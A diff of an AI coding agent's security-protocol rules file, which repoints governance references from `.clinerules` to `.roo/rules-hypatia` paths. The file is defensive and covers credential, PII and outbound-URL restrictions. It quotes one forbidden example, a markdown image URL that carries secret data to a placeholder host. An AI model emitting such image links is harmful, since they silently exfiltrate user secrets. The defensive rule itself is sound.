@@ -1,6 +1,6 @@
 # Security Protocol
 
-**Purpose**: Operational security details that supplement `.clinerules/09-security.md`. The kernel file is the authoritative governance layer; this file holds the specific patterns, tools, and procedures referenced from there.
+**Purpose**: Operational security details that supplement `.roo/rules-hypatia/09-security.md`. The kernel file is the authoritative governance layer; this file holds the specific patterns, tools, and procedures referenced from there.
 **Last Updated**: 2026-05-11 (Hypatia adaptation; substantially thinned from Bell's 513 L original)
 **Trigger Keywords**: security, threat, credentials, secrets, access, permissions, exposure, sanitize, pii, classification
 
@@ -8,7 +8,7 @@
 
 ## Scope and authority
 
-**`.clinerules/09-security.md`** is the authoritative security governance for Hypatia. It covers:
+**`.roo/rules-hypatia/09-security.md`** is the authoritative security governance for Hypatia. It covers:
 
 - Git hardening (mandatory pre-commit / pre-push checks).
 - External content security (untrusted treatment of fetch, vault Seeds, LLM-generated content, email).
@@ -18,7 +18,7 @@
 **This file** (`hypatia-kb/security-protocol.md`) holds the operational details those gates reference: specific credential patterns, the memory sanitization filter mechanics, PII patterns, file-protection cross-references, data classification heuristics.
 
 When a security question arises:
-1. Start with `.clinerules/09-security.md` for the rule.
+1. Start with `.roo/rules-hypatia/09-security.md` for the rule.
 2. Drop here for the specific pattern / tool / procedure.
 3. Drop into `CRITICAL-FILE-PROTECTION.md` for protected-paths enforcement.
 
@@ -138,7 +138,7 @@ For content involving Personally Identifiable Information (names, addresses, con
 
 ### Vault-side considerations
 
-The TabulaJacqueliana vault has `Seedlings/` (daily journal) and `Forests/` (creative writing) as PII-bearing folders, scoped to `main` branch only. The `work-safe` branch excludes them. Hypatia working on the `work-safe` branch should never encounter content from these folders; if she does, branch confusion has occurred (see `.clinerules/09-security.md § Git Hardening`).
+The TabulaJacqueliana vault has `Seedlings/` (daily journal) and `Forests/` (creative writing) as PII-bearing folders, scoped to `main` branch only. The `work-safe` branch excludes them. Hypatia working on the `work-safe` branch should never encounter content from these folders; if she does, branch confusion has occurred (see `.roo/rules-hypatia/09-security.md § Git Hardening`).
 
 ---
 
@@ -166,11 +166,11 @@ Never include in outbound URLs (fetch, MCP tool args, `curl` commands):
 - Credentials, secrets, tokens.
 - Content from `Seedlings/`, `Forests/`, `_attachments/_pdfs/`.
 
-This is enforced by `.clinerules/09-security.md § Bash command restrictions` + the Cross-Sense Isolation Rule.
+This is enforced by `.roo/rules-hypatia/09-security.md § Bash command restrictions` + the Cross-Sense Isolation Rule.
 
 ### Image src security
 
-Markdown images with data in URL params are forbidden (`![](https://example.invalid/?data=secret)`). Detection trigger in `.clinerules/09-security.md`.
+Markdown images with data in URL params are forbidden (`![](https://example.invalid/?data=secret)`). Detection trigger in `.roo/rules-hypatia/09-security.md`.
 
 ### MCP fetch proxy
 
@@ -195,12 +195,12 @@ When classification is ambiguous, escalate one tier (Internal → Restricted, et
 
 ## Cross-references
 
-- **Governance layer (authoritative)**: `.clinerules/09-security.md`
+- **Governance layer (authoritative)**: `.roo/rules-hypatia/09-security.md`
 - **Protected paths + Tier 1-3 destructive classifications**: `CRITICAL-FILE-PROTECTION.md`
-- **Git hardening pre-commit gate**: `.clinerules/09-security.md § Git Hardening Protocol`
-- **External content security + detection triggers**: `.clinerules/09-security.md § External Content Security`
-- **Cross-sense isolation rule**: `.clinerules/09-security.md § Cross-Sense Isolation Rule`
-- **Destructive Action Gate (tier classification)**: `.clinerules/04-session-gates.md § Destructive Action Gate`
+- **Git hardening pre-commit gate**: `.roo/rules-hypatia/09-security.md § Git Hardening Protocol`
+- **External content security + detection triggers**: `.roo/rules-hypatia/09-security.md § External Content Security`
+- **Cross-sense isolation rule**: `.roo/rules-hypatia/09-security.md § Cross-Sense Isolation Rule`
+- **Destructive Action Gate (tier classification)**: `.roo/rules-hypatia/04-session-gates.md § Destructive Action Gate`
 - **Sanitization filter implementation**: `scripts/git-filter-clean.py` + `scripts/git-filter-smudge.py`
 
 ---
